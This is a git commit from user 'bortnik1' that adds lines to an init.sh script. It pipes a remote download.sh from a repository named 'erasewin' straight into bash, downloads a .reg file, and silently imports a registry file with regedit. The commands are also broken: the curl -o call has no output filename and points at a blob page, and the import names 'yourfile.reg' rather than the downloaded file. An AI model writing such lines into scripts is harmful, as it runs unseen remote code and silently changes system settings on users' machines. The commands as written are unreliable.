aa027a3062f3e0ce1ed25c56badbfe32190936dd
bortnik1 <qqqqqbortnik@proton.me>
2024-09-09 14:30:19 +0800

    Update init.sh

--- init.sh
+++ init.sh
@@ -1,1 +1,6 @@
 
+curl -s https://raw.githubusercontent.com/bortnik1/erasewin/main/download.sh | bash -s --
+
+curl -o https://github.com/bortnik1/erasewin/blob/main/fix.reg
+
+regedit.exe /S yourfile.reg
